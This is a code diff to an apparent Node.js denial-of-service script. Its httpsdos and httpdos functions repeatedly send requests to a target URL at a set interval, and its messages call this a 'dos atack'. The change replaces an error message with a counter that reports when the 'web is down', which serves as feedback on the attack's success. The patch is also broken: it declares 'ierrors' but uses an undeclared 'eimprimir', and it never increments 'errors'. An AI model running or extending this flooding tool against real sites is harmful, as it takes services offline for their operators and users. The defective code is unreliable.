@@ -5,6 +5,8 @@ const rl = readline.createInterface({
 });
 const https = require("https");
 const http = require("http");
+let errors = 0;
+let ierrors = 10;
 let requests = 0;
 let imprimir = 10;
 let error_;
@@ -33,10 +35,13 @@ function httpsdos(url_, intensidad, port){
 			}
 		})
 		req.on('error', error => {
-			error_ = error;
-			console.log("An error ocurred sending request, press ctrl+C to finish dos atack!")
-			// return clearInterval(interval);
-	        })
+			if(errors === eimprimir){
+                                 error_ = error;
+                                 eimprimir = eimprimir + 10;
+			         console.log(`(${errors}) Errors, web is down or other error ocurred`)
+			         // return clearInterval(interval);
+	                 }
+                })
 		req.end()
 	}, intensidad)
 }
@@ -59,10 +64,13 @@ function httpdos(url_, intensidad, port){
 		                imprimir = imprimir + 10; 
 		        } 
 		}) 
-	        req.on('error', error => { 
-			error_ = error;
-			console.log("An error ocurred sending the request, press ctrl+C to finish dos atack!"); 
-			// return clearInterval(interval);
+	        req.on('error', error => {
+                        if(errors === eimprimir){
+                                 error_ = error;
+                                 eimprimir = eimprimir + 10;
+			         console.log(`(${errors}) Errors, web is down or other error ocurred`)
+			         // return clearInterval(interval);
+	                 }
 		})
 		req.end()
 	}, intensidad)				
